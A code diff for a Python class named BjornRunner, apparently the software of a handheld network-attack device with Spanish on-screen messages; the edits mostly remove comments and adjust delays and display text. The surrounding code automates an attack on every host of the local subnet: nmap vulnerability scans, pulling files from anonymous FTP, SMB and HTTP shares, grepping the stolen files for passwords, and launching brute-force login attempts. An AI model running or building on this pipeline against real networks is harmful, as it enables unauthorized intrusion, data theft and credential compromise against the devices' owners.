@@ -57,10 +57,10 @@ class BjornRunner:
                 "--min-rate", quick_rate, "-n", "-r", "-Pn", "--open", "-oG", "-"
             ] + live_ips
 
-            # Timeout generoso + sin -sV = siempre rápido (<30s incluso con 30 dispositivos)
+          
             result = subprocess.run(quick_cmd, stdout=subprocess.PIPE, text=True, timeout=120)
 
-            # Solo procesamos si nmap terminó bien
+     
             if result.returncode not in (0, 124):
                 raise Exception("nmap quick scan error")
 
@@ -83,13 +83,13 @@ class BjornRunner:
                             elif "22/open" in line_lower or "ssh" in line_lower:
                                 host_scores[current_ip] += 25
 
-            # Orden descendente: más vulnerable primero
+          
             sorted_ips = sorted(live_ips, key=lambda ip: (-host_scores.get(ip, 0), ip))
 
             high_vuln = [ip for ip in sorted_ips if host_scores.get(ip, 0) >= 80]
             if high_vuln:
-                self.display.show_message([f"Alta prioridad: {len(high_vuln)}", "routers/telnet/web"], center=True)
-                time.sleep(1.0)
+                self.display.show_message([f"PRIORIDAD EN: {len(high_vuln)}"], center=True)
+                time.sleep(1.5)
 
             return sorted_ips
 
@@ -98,10 +98,9 @@ class BjornRunner:
             return live_ips[:]
 
     def run(self):
-        """Menú principal de BJORN"""
         if not is_wifi_client_connected():
             self.display.show_message([" No conectado a ", " WiFi como cliente "], center=True)
-            time.sleep(2)
+            time.sleep(1.5)
             return
 
         options = ["SCAN_BJORN", "DELETE_ALL", "BACK"]
@@ -121,11 +120,11 @@ class BjornRunner:
                     return
                 elif choice == "SCAN_BJORN":
                     self._run_scan()
-                    position = 0
+        
                     last_pos = -1
                 elif choice == "DELETE_ALL":
                     self._clear_reports()
-                    position = 0
+    
                     last_pos = -1
 
             if position != last_pos:
@@ -150,12 +149,11 @@ class BjornRunner:
         own_ip = get_own_ip()
         if not own_ip:
             self.display.show_message(["Error: No se pudo", "obtener IP propia"], center=True)
-            time.sleep(2)
+            time.sleep(1.5)
             return
 
         subnet = ".".join(own_ip.split(".")[:3]) + ".0/24"
 
-        # === Descubrimiento rápido de dispositivos vivos ===
         self.display.show_message([" Descubriendo hosts ", " en LAN... ", f"Snet:{subnet}"], center=False)
         live_ips = []
         try:
@@ -177,15 +175,15 @@ class BjornRunner:
 
         if not live_ips:
             self.display.show_message(["No se encontraron", "dispositivos conectados"], center=True)
-            time.sleep(2)
+            time.sleep(1.5)
             return
 
-        # === PRIORIZACIÓN ===
+      
         live_ips = self._prioritize_hosts(live_ips)
-        self.display.show_message([f"Encontrados y priorizados:", " {len(live_ips)} "], center=True)
-        time.sleep(1.0)
+        self.display.show_message([f" Total Conectados: ", f" {len(live_ips)} "], center=True)
+        time.sleep(1.5)
 
-        # Optimización dinámica según cantidad de dispositivos
+       
         num_hosts = len(live_ips)
         if num_hosts > 15:
             vuln_min_rate = "120"
@@ -203,8 +201,8 @@ class BjornRunner:
             brute_min_rate = "45"
             brute_threads = "2"
 
-        # === Escaneo de vulnerabilidades ===
-        self.display.show_message(["Escaneando", f"{num_hosts} dispositivos","buscando...", "vulnerabilidades..."], center=False)
+       
+        self.display.show_message(["ANALIZANDO:", f"{num_hosts} dispositivos","buscando...", "vulnerabilidades..."], center=False)
         try:
             nmap_cmd = [
                 "sudo", "nmap", "-sV", "--script", "vuln",
@@ -219,21 +217,21 @@ class BjornRunner:
 
             if result.returncode != 0 and result.returncode != 124:
                 self.display.show_message([" Error en Nmap ", " Inténtalo de nuevo "], center=True)
-                time.sleep(2)
+                time.sleep(1.5)
                 self._cleanup_processes()
                 return
         except subprocess.TimeoutExpired:
             self.display.show_message([" Scan timeout ", " Red muy grande "], center=True)
-            time.sleep(2)
+            time.sleep(1.5)
             self._cleanup_processes()
             return
         except Exception as e:
             self.display.show_message([" Error inesperado ", str(e)[:20]], center=True)
-            time.sleep(2)
+            time.sleep(1.5)
             self._cleanup_processes()
             return
 
-        # === Exfiltración ===
+       
         self.display.show_message(["Exfiltrando archivos", "SMB/FTP/HTTP/HTTPS"], center=True)
         exfil_dir = os.path.join(self.report_dir, f"exfil_{self.timestamp}")
         os.makedirs(exfil_dir, exist_ok=True)
@@ -257,7 +255,6 @@ class BjornRunner:
                 except Exception:
                     log.write(" FTP: No accesible / timeout\n")
 
-                # SMB anónimo
                 log.write("→ Intentando SMB shares...\n")
                 try:
                     list_cmd = ["smbclient", "-L", f"//{ip}", "-N", "-g"]
@@ -282,7 +279,6 @@ class BjornRunner:
                 except Exception as e:
                     log.write(f" SMB error: {str(e)[:80]}\n")
 
-                # HTTP/HTTPS anónimo
                 log.write("→ Intentando HTTP/HTTPS anónimos...\n")
                 for scheme in ["http", "https"]:
                     try:
@@ -298,8 +294,7 @@ class BjornRunner:
                     except Exception:
                         log.write(f" {scheme.upper()}: No accesible / timeout\n")
 
-            # BÚSQUEDA AUTOMÁTICA DE CONTRASEÑAS
-            log.write("\n=== BÚSQUEDA DE CONTRASEÑAS EN ARCHIVOS EXFILTRADOS ===\n")
+            log.write("\n=== POSIBLES CONTRASEÑAS ===\n")
             try:
                 pw_find = subprocess.run([
                     "grep", "-r", "-i", "-E",
@@ -307,15 +302,14 @@ class BjornRunner:
                     exfil_dir
                 ], capture_output=True, text=True, timeout=20)
                 if pw_find.stdout.strip():
-                    log.write("¡POSIBLES CONTRASEÑAS ENCONTRADAS!\n")
                     log.write(pw_find.stdout[:2000] + "\n... (truncado)\n")
                 else:
                     log.write("No se encontraron patrones de contraseñas.\n")
             except Exception as e:
                 log.write(f"Error en búsqueda PW: {str(e)[:100]}\n")
 
-        # === Fuerza bruta ===
-        self.display.show_message(["Fuerza bruta en", "credenciales (SSH/FTP", "WEB y más...)"], center=True)
+      
+        self.display.show_message([" REALIZANDO: ", " fuerza bruta en ", " dispositivos ", " aguarde... "], center=True)
         time.sleep(1.0)
         try:
             brute_cmd = [
@@ -334,7 +328,7 @@ class BjornRunner:
         except Exception:
             pass
 
-        # Parse de resultados (sin cambios)
+        
         vulns_list = self._parse_vuln_report(self.report_txt)
         brute_list = self._parse_brute_report(self.brute_report)
 
@@ -347,9 +341,9 @@ class BjornRunner:
 
         if not findings_list:
             self.display.show_message(["No se encontraron:", "- vulnerabilidades", "- credenciales"], center=True)
-            time.sleep(2)
+            time.sleep(1.5)
             self.display.show_message(["Exfil + Brute en:", f"exfil_{self.timestamp}/", f"bjorn_scan_{self.timestamp}.txt"], center=False)
-            time.sleep(4)
+            time.sleep(1.5)
             self._cleanup_processes()
             return
 
@@ -358,9 +352,9 @@ class BjornRunner:
             f"Hosts: {num_hosts}"
         ]
         self.display.show_message(summary_lines, center=False)
-        time.sleep(2.5)
+        time.sleep(0.8)
 
-        # Menú de resultados
+       
         options = [f"{ip} → {summary[:28]}..." for ip, summary in findings_list]
         options.append("BACK")
         position = 0
@@ -413,10 +407,10 @@ class BjornRunner:
 
         if not os.path.isdir(self.report_dir):
             self.display.show_message(["   Carpeta no existe   "], center=True)
-            time.sleep(2)
+            time.sleep(1.5)
             return
 
-        # 🔍 Verificar si hay contenido
+        
         has_content = False
         for _, dirs, files in os.walk(self.report_dir):
             if files or dirs:
@@ -425,14 +419,14 @@ class BjornRunner:
 
         if not has_content:
             self.display.show_message(["   No hay reportes   ", "   para borrar   "], center=True)
-            time.sleep(2)
+            time.sleep(1.5)
             return
 
-        # ==================== TRANSICIÓN ANTI DOBLE ENTER ====================
+       
         self.display.show_message(["   ¿Borrar TODO?   "], center=True)
-        time.sleep(1.0)  
+        time.sleep(1.5)  
 
-        # 📋 Menú de confirmación
+       
         options = ["NO", "SI, BORRAR TODO"]
         position = 0
         last_pos = -1
@@ -451,9 +445,9 @@ class BjornRunner:
                     time.sleep(1.5)
                     return
                 else:
-                    break  # confirma borrado
+                    break  
 
-            # Render pantalla
+        
             if position != last_pos:
                 self.display.render(
                     options,
@@ -463,7 +457,7 @@ class BjornRunner:
 
             time.sleep(REPEAT_DELAY)
 
-        # Borrado real
+      
         self.display.show_message(["  Borrando TODO...  "], center=True)
         time.sleep(1)
 
@@ -474,7 +468,7 @@ class BjornRunner:
         except Exception as e:
             self.display.show_message(["  Error borrando.  ", str(e)[:20]], center=True)
 
-        time.sleep(2)   
+        time.sleep(1.5)   
 
         
     def _parse_vuln_report(self, report_path):
